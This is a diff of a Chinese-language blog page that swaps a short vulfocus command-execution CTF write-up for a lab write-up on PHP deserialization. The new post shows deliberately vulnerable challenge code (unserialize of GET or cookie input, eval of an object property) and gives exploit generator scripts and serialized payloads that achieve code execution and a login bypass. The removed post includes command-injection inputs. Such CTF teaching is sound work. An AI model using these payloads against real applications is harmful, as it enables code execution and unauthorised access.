@@ -19,25 +19,26 @@
   <meta name="author" content="Lixiney">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.运行环境进入首页 返回 index.php?cmd&#x3D;ls &#x2F;tmp 2.将其拼接到浏览器 url 栏后面发现输出了一段文字，但是看的不是很明显，CTRL+U 查看页面源代码 发现有两行东西，这就说明这个目录下面就一个index.php 文件 推测执行了 ls 系统命令 3.替换其他指令查找 flag执行下列命令 find &#x2F; -name &#x27;*flag*&#x27;">
+    <meta name="description" content="所有的 flag 均在 flag.php 的 $flag 变量中  level 1&lt;?php highlight_file(__FILE__); class a&#123;     var $act;     function action()&#123;         eval($this-&gt;act);     &#125; &#125; $a&#x3D;unserialize($_GET">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulfocus|命令执行漏洞WP">
-<meta property="og:url" content="https://blog.lixey.top/posts/83c1bda7/index.html">
+<meta property="og:title" content="PHP代码审计-反序列化漏洞">
+<meta property="og:url" content="https://blog.lixey.top/posts/bcdf8f30/index.html">
 <meta property="og:site_name" content="Lixiney&#39;s Blog">
-<meta property="og:description" content="1.运行环境进入首页 返回 index.php?cmd&#x3D;ls &#x2F;tmp 2.将其拼接到浏览器 url 栏后面发现输出了一段文字，但是看的不是很明显，CTRL+U 查看页面源代码 发现有两行东西，这就说明这个目录下面就一个index.php 文件 推测执行了 ls 系统命令 3.替换其他指令查找 flag执行下列命令 find &#x2F; -name &#x27;*flag*&#x27;">
+<meta property="og:description" content="所有的 flag 均在 flag.php 的 $flag 变量中  level 1&lt;?php highlight_file(__FILE__); class a&#123;     var $act;     function action()&#123;         eval($this-&gt;act);     &#125; &#125; $a&#x3D;unserialize($_GET">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-07-06T05:10:16.000Z">
-<meta property="article:modified_time" content="2025-07-06T05:20:38.933Z">
+<meta property="article:published_time" content="2025-07-08T13:38:45.000Z">
+<meta property="article:modified_time" content="2025-07-08T14:05:18.889Z">
 <meta property="article:author" content="Lixiney">
-<meta property="article:tag" content="命令执行">
-<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>vulfocus|命令执行漏洞WP - Lixiney&#39;s Blog</title>
+  <title>PHP代码审计-反序列化漏洞 - Lixiney&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -155,7 +156,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulfocus|命令执行漏洞WP"></span>
+            <span id="subtitle" data-typed-text="PHP代码审计-反序列化漏洞"></span>
           
         </div>
 
@@ -171,8 +172,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-06 13:10" pubdate>
-          July 6, 2025 pm
+        <time datetime="2025-07-08 21:38" pubdate>
+          July 8, 2025 pm
         </time>
       </span>
     
@@ -183,7 +184,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          117 words
+          425 words
         
       </span>
     
@@ -194,7 +195,7 @@
         
         
         
-          1 mins
+          4 mins
         
       </span>
     
@@ -240,12 +241,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">vulfocus|命令执行漏洞WP</h1>
+            <h1 id="seo-header">PHP代码审计-反序列化漏洞</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    Last updated on July 6, 2025 pm
+                    Last updated on July 8, 2025 pm
                   
                 
               </p>
@@ -253,15 +254,119 @@
             
               <div class="markdown-body">
                 
-                <h1 id="1-运行环境"><a href="#1-运行环境" class="headerlink" title="1.运行环境"></a>1.运行环境</h1><p>进入首页 返回 index.php?cmd&#x3D;ls &#x2F;tmp</p>
-<h1 id="2-将其拼接到浏览器-url-栏后面"><a href="#2-将其拼接到浏览器-url-栏后面" class="headerlink" title="2.将其拼接到浏览器 url 栏后面"></a>2.将其拼接到浏览器 url 栏后面</h1><p>发现输出了一段文字，但是看的不是很明显，CTRL+U 查看页面源代码</p>
-<p>发现有两行东西，这就说明这个目录下面就一个index.php 文件</p>
-<p>推测执行了 ls 系统命令</p>
-<h1 id="3-替换其他指令查找-flag"><a href="#3-替换其他指令查找-flag" class="headerlink" title="3.替换其他指令查找 flag"></a>3.替换其他指令查找 flag</h1><p>执行下列命令</p>
-<div class="code-wrapper"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;*flag*&#x27;</span></code></pre></div>
+                <blockquote>
+<p>所有的 flag 均在 flag.php 的 $flag 变量中</p>
+</blockquote>
+<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);
+    &#125;
+&#125;
+<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);
+<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">action</span>();
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<p>获得flag</p>
-<p>flag-{bmh8bd27630-a4fd-4bfa-a7c8-61af1a1f0f0b}</p>
+<p>eval函数为代码执行函数，将字符串作为php代码执行，已知 flag 在 flag.php 文件中，先将 flag.php 文件包含进来，再对 flag 变量进行输出</p>
+<p>exp:</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);
+    &#125;
+&#125;
+<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> a;
+<span class="hljs-variable">$test</span>-&gt;act = <span class="hljs-string">&#x27;include(&quot;flag.php&quot;);echo $flag;&#x27;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>)</code></pre></div>
+
+<p>生成的payload：</p>
+<blockquote>
+<p>O:1:”a”:1:{s:3:”act”;s:31:”include(“flag.php”);echo $flag;”;}</p>
+</blockquote>
+<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())
+&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>login 方法中校验 user 和 pass 的值，如果返回结果为真，则输出 $flag</p>
+<p>__construct 初始化方法</p>
+<p>exp:</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mylogin</span>(<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-string">&quot;ok&quot;</span>);
+
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>payload:</p>
+<blockquote>
+<p>O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
+</blockquote>
+<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())
+&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>与 level 2 相似 注意 超全局变量 $_COOKIE ，通过cookie 传参传入 payload ，同时进行一下url编码</p>
+<p>payload：</p>
+<blockquote>
+<p>O%3a7%3a%22mylogin%22%3a2%3a%7bs%3a4%3a%22user%22%3bs%3a8%3a%22daydream%22%3bs%3a4%3a%22pass%22%3bs%3a2%3a%22ok%22%3b%7d</p>
+</blockquote>
+<p>未完待续。。。</p>
 
                 
               </div>
@@ -295,9 +400,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
       
-        <a href="/tags/WriteUp/" class="print-no-link">#WriteUp</a>
+        <a href="/tags/php/" class="print-no-link">#php</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
       
     </div>
   
@@ -309,8 +416,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulfocus|命令执行漏洞WP</div>
-      <div>https://blog.lixey.top/posts/83c1bda7/</div>
+      <div>PHP代码审计-反序列化漏洞</div>
+      <div>https://blog.lixey.top/posts/bcdf8f30/</div>
     </div>
     <div class="license-meta">
       
@@ -322,7 +429,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>July 6, 2025</div>
+          <div>July 8, 2025</div>
         </div>
       
       
@@ -354,18 +461,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/bcdf8f30/" title="PHP代码审计-反序列化漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PHP代码审计-反序列化漏洞</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/2bf21027/" title="Python-Django开发">
-                        <span class="hidden-mobile">Python-Django开发</span>
+                      <a href="/posts/83c1bda7/" title="vulfocus|命令执行漏洞WP">
+                        <span class="hidden-mobile">vulfocus|命令执行漏洞WP</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
